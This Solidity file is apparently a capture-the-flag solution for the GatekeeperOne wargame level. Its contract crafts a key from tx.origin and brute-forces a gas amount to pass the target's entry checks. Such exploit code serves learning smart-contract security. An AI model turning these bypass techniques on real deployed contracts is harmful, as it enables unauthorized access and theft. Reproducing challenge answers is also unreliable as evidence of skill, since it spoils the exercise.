// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "./GatekeeperOne.sol";


contract BatteringRam {
    GatekeeperOne public GatekeeperOneContract;

    constructor(address _GatekeeperOneContract){
        GatekeeperOneContract = GatekeeperOne(_GatekeeperOneContract);
    }


    function enter(uint256 gas) external {

        uint16 k16 = uint16(uint160(tx.origin));
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        bytes8 key = bytes8(k64);

        require(gas < 8191, "gas > 8191");
        require(GatekeeperOneContract.enter{gas: 8191 * 10 + gas}(key), "failed");
    }
}

